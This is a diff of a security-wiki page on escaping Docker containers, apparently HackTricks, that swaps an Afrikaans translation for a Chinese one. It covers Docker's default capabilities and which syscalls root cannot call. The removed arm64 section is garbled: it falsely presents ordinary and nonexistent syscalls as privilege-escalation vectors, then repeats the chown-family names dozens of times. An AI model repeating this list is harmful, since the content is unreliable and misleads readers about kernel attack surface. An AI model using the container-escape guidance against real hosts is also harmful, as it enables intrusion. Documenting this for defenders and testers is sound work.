-* **Vermoeëns**: Docker laat die volgende vermoëns oor: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscalls**: Dit is die syscalls wat die **root-gebruiker nie sal kan aanroep nie** (wegens 'n gebrek aan vermoëns + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.
+* **命名空间：** 进程应该通过命名空间与其他进程 **完全隔离**，因此我们无法通过命名空间与其他进程交互（默认情况下无法通过 IPC、Unix 套接字、网络服务、D-Bus、其他进程的 `/proc` 进行通信）。
+* **根用户**：默认情况下，运行进程的用户是根用户（但其权限是有限的）。
+* **能力**：Docker 保留以下能力：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **系统调用**：这些是 **根用户无法调用** 的系统调用（因为缺乏能力 + Seccomp）。其他系统调用可以用来尝试逃逸。
 
 {% tabs %}
 {% tab title="x64 syscalls" %}
@@ -545,581 +546,7 @@ Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [
 ```
 {% endtab %}
 
-{% tab title="arm64 syscalls" %}  
-### arm64-syscalls
-
-Hierdie is 'n lys van arm64 syscalls wat gebruik kan word vir priviligie-escalasie in Docker.  
-Die volgende syscalls kan gebruik word vir priviligie-escalasie in Docker:
-
-- `sys_memfd_create`
-- `sys_bpf`
-- `sys_execveat`
-- `sys_userfaultfd`
-- `sys_membarrier`
-- `sys_mlock2`
-- `sys_copy_file_range`
-- `sys_pkey_mprotect`
-- `sys_pkey_alloc`
-- `sys_pkey_free`
-- `sys_statx`
-- `sys_rseq`
-- `sys_io_pgetevents`
-- `sys_pidfd_open`
-- `sys_clone3`
-- `sys_open_tree`
-- `sys_move_mount`
-- `sys_fsopen`
-- `sys_fsconfig`
-- `sys_fsmount`
-- `sys_fspick`
-- `sys_pidfd_getfd`
-- `sys_clone_file_range`
-- `sys_openat2`
-- `sys_pidfd_send_signal`
-- `sys_io_uring_setup`
-- `sys_io_uring_enter`
-- `sys_io_uring_register`
-- `sys_openat`
-- `sys_mkdirat`
-- `sys_mknodat`
-- `sys_faccessat`
-- `sys_fchmodat`
-- `sys_fchownat`
-- `sys_fexecve`
-- `sys_fstatat`
-- `sys_futimesat`
-- `sys_linkat`
-- `sys_mkdirat`
-- `sys_mknodat`
-- `sys_newfstatat`
-- `sys_openat`
-- `sys_readlinkat`
-- `sys_renameat`
-- `sys_symlinkat`
-- `sys_unlinkat`
-- `sys_utimensat`
-- `sys_bind`
-- `sys_connect`
-- `sys_listen`
-- `sys_accept4`
-- `sys_getsockname`
-- `sys_getpeername`
-- `sys_socket`
-- `sys_socketpair`
-- `sys_sendto`
-- `sys_sendmsg`
-- `sys_recvfrom`
-- `sys_recvmsg`
-- `sys_shutdown`
-- `sys_setsockopt`
-- `sys_getsockopt`
-- `sys_poll`
-- `sys_epoll_create`
-- `sys_epoll_create1`
-- `sys_epoll_ctl`
-- `sys_epoll_ctl_old`
-- `sys_epoll_pwait`
-- `sys_epoll_wait`
-- `sys_epoll_wait_old`
-- `sys_getdents64`
-- `sys_fcntl`
-- `sys_flock`
-- `sys_fsync`
-- `sys_fdatasync`
-- `sys_truncate`
-- `sys_ftruncate`
-- `sys_getcwd`
-- `sys_chdir`
-- `sys_fchdir`
-- `sys_rename`
-- `sys_renameat`
-- `sys_renameat2`
-- `sys_chmod`
-- `sys_fchmod`
-- `sys_fchmodat`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_access`
-- `sys_faccessat`
-- `sys_chdir`
-- `sys_fchdir`
-- `sys_chroot`
-- `sys_fchroot`
-- `sys_readlink`
-- `sys_readlinkat`
-- `sys_symlink`
-- `sys_symlinkat`
-- `sys_unlink`
-- `sys_unlinkat`
-- `sys_rmdir`
-- `sys_mkdir`
-- `sys_mkdirat`
-- `sys_mknod`
-- `sys_mknodat`
-- `sys_link`
-- `sys_linkat`
-- `sys_rename`
-- `sys_renameat`
-- `sys_renameat2`
-- `sys_chmod`
-- `sys_fchmod`
-- `sys_fchmodat`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_f
+{% tab title="arm64 系统调用" %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -1139,28 +566,7 @@ Die volgende syscalls kan gebruik word vir priviligie-escalasie in Docker:
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}  
-### Docker Breakout Privilege Escalation
-
-#### Overview
-
-Hierdie tegniek demonstreer hoe 'n aanvaller vanuit 'n Docker-houer kan ontsnap en bevoorregting kan verhoog deur die gebruik van 'n spesifieke kwesbaarheid in die Linux-kernel.
-
-#### Beskrywing
-
-Die aanvaller maak gebruik van 'n spesifieke kwesbaarheid in die Linux-kernel om toegang te verkry tot die host-stelsel vanuit 'n Docker-houer. Hierdie aanval vereis dat die aanvaller reeds toegang het tot 'n Docker-houer op die teikenstelsel.
-
-#### Aanvalstegniek
-
-1. Identifiseer die kwesbaarheid: Die aanvaller identifiseer 'n spesifieke kwesbaarheid in die Linux-kernel wat dit vir hom moontlik maak om vanuit 'n Docker-houer na die host-stelsel te ontsnap.
-2. Skryf 'n kwaadwillige kode: Die aanvaller skryf 'n kwaadwillige kode wat die kwesbaarheid uitbuit en hom toegang gee tot die host-stelsel.
-3. Voer die kode uit: Die aanvaller voer die kwaadwillige kode binne die Docker-houer uit om toegang te verkry tot die host-stelsel.
-4. Verhoog bevoorregting: Met toegang tot die host-stelsel kan die aanvaller sy bevoorregting verhoog en verdere aanvalle uitvoer.
-
-#### Voorkoming
-
-Om hierdie tipe aanval te voorkom, moet die Linux-kernel opgedateer word om die kwesbaarheid te verhelp wat deur die aanvaller uitgebuit word. Dit is ook belangrik om streng beperkings op te lê aan Docker-houers om die impak van 'n moontlike aanval te verminder.  
-{% endtab %}
+{% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
